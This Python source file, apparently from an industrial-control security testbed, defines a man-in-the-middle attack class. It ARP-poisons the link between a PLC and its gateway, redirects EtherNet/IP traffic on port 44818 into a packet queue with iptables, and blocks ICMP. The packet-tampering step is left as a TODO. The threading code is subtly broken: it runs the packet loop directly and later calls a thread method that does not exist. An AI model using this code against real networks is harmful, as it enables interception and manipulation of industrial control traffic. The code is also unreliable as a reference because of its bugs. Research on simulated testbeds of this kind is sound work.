import argparse
import os
import threading
import fnfqueue

from pathlib import Path

from dhalsim.network_attacks.utilities import launch_arp_poison, restore_arp
from synced_attack import SyncedAttack


class MitmAttack(SyncedAttack):
    """
    This is a Man In The Middle attack class. This kind of attack will modify
    the data that is passed around in packages on the network, in order to
    change the values of tags before they reach the requesting PLC.

    A man in the middle attack always sits in between a PLC and its
    corresponding gateway.

    :param intermediate_yaml_path: The path to the intermediate YAML file
    :param yaml_index: The index of the attack in the intermediate YAML
    """

    def __init__(self, intermediate_yaml_path: Path, yaml_index: int):
        super().__init__(intermediate_yaml_path, yaml_index)
        self.queue = fnfqueue.Connection()
        self.state = 0
        self.q = None
        self.thread = None

    def setup(self):
        print("ATTACKER SETTING UP 🔧")
        # Add the iptables rules
        os.system('iptables -t mangle -A PREROUTING -p tcp --dport 44818 -j NFQUEUE --queue-num 1')
        os.system('iptables -A FORWARD -p icmp -j DROP')
        os.system('iptables -A INPUT -p icmp -j DROP')
        os.system('iptables -A OUTPUT -p icmp -j DROP')

        launch_arp_poison("192.168.1.1", "192.168.1.254")

        try:
            self.q = self.queue.bind(1)
            self.q.set_mode(fnfqueue.MAX_PAYLOAD, fnfqueue.COPY_PACKET)
            self.thread = threading.Thread(target=self.packet_thread_function()).start()
        except PermissionError:
            print("Permission Error. Am I running as root?")

    def packet_thread_function(self):
        print("Thread starting 🔀")
        while True:
            try:
                for packet in self.queue:
                    #TODO The actual mitm stuff
                    print("Packet: ", packet)
                    print("Packet dict: ", packet.__dict__)
                    print("Packet payload: ", packet.payload)
                    packet.mangle()
            except fnfqueue.BufferOverflowException:
                print("Buffer Overflow in a MITM attack!")

    def teardown(self):
        # Delete iptables rules
        os.system('iptables -t mangle -D PREROUTING  -p tcp --dport 44818 -j NFQUEUE --queue-num 1')
        os.system('iptables -D FORWARD -p icmp -j DROP')
        os.system('iptables -D INPUT -p icmp -j DROP')
        os.system('iptables -D OUTPUT -p icmp -j DROP')

        restore_arp("192.168.1.1", "192.168.1.254")

        self.thread.exit()

    def attack_step(self):
        print("Attacker gets clock:", self.get_master_clock())
        if self.state == 0:
            if self.intermediate_attack["start"] <= self.get_master_clock() <= self.intermediate_attack["end"]:
                self.setup()
                self.state = 1
        elif self.state == 1:
            if not self.intermediate_attack["start"] <= self.get_master_clock() <= self.intermediate_attack["end"]:
                self.teardown()
                self.state = 2


def is_valid_file(parser_instance, arg):
    if not os.path.exists(arg):
        parser_instance.error(arg + " does not exist")
    else:
        return arg


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Start everything for an attack')
    parser.add_argument(dest="intermediate_yaml",
                        help="intermediate yaml file", metavar="FILE",
                        type=lambda x: is_valid_file(parser, x))
    parser.add_argument(dest="index", help="Index of the network attack in intermediate yaml", type=int,
                        metavar="N")

    args = parser.parse_args()

    attack = MitmAttack(
        intermediate_yaml_path=Path(args.intermediate_yaml),
        yaml_index=args.index)
    attack.main_loop()
